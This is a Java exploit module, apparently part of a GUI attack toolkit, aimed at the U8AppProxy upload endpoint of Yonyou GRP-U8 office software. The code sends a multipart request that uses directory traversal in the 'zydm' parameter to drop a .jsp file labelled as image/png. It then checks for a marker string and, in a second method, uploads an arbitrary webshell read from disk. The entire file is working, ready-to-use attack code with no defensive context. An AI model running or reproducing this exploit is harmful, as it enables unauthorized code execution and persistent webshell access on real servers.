package exp.oa.yongyou.grp;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.Methods;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Date;
import java.util.HashMap;

public class yongyou_grpu8_U8AppProxy_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String UploadFileData(String url1,String filename,String content){
        try {
            // 创建URL对象
            URL url = new URL(url1);

            // 打开连接
            HttpURLConnection connection = HttpTools.getCoon(url1);

            // 设置请求方法为GET
            connection.setRequestMethod("POST");

            // 设置请求头
            connection.setRequestProperty("Content-Type","multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b");

            // 启用输出流
            connection.setDoOutput(true);

            // 构造请求体
            String requestBody = "--59229605f98b8cf290a7b8908b34616b\r\n" +
                    "Content-Disposition: form-data; name=\"file\";filename=\"1.jsp\"\r\n" +
                    "Content-Type: image/png\r\n" +
                    "\r\nR4g" +
                    content+
                    "\r\n" +
                    "--59229605f98b8cf290a7b8908b34616b--";

            // 获取输出流并写入请求体
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(requestBody.getBytes());
            outputStream.flush();
            outputStream.close();

            // 获取响应码
            int responseCode = connection.getResponseCode();
            System.out.println("Response Code: " + responseCode);


            connection.disconnect();

        } catch (Exception e) {
            return filename;
        }
        return filename;
    }

    private Boolean att(String url,TextArea textArea) {
        try {
//            String shell_payload = shell.readFile(shell.Jsppath);
            long t = (new Date()).getTime();
            String filename = t+".jsp";
            String payload = "Hello R4g";
            String result = UploadFileData(url+"/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../"+t,filename,payload);
            Response get = HttpTools.get(url+"/"+result,new HashMap<>(),"utf-8");
            if (  get.getText().contains("R4g")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_grpu8_U8AppProxy_upload ]");

                    textArea.appendText("\n 文件上传成功: "+result+" \n 访问成功: "+get.getText());

                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }


    private Boolean attcmd(String url,String pass, TextArea textArea,TextArea textArea_cmd) {
        try {


            String shell_payload = Methods.readFile(pass);
            long tt = (new Date()).getTime();
            String filename = "R4g"+tt+".jsp";
            String payload = tt+"\n" + shell_payload;
            String result = UploadFileData(url+"/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../"+tt,filename,payload);

            Response get = HttpTools.get(url+"/"+result,new HashMap<>(),"utf-8");
            if ( get.getCode()==200&&get.getText().contains(tt+"")) {

                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: "+result+"----"+get.getText());
                });
                return true;


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败，请手工测试");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件上传失败，请手工测试");
                textArea.appendText("\n 连接异常！！！");
//                textArea.appendText(var8.getMessage());
            });
        }
        return false;
    }
}
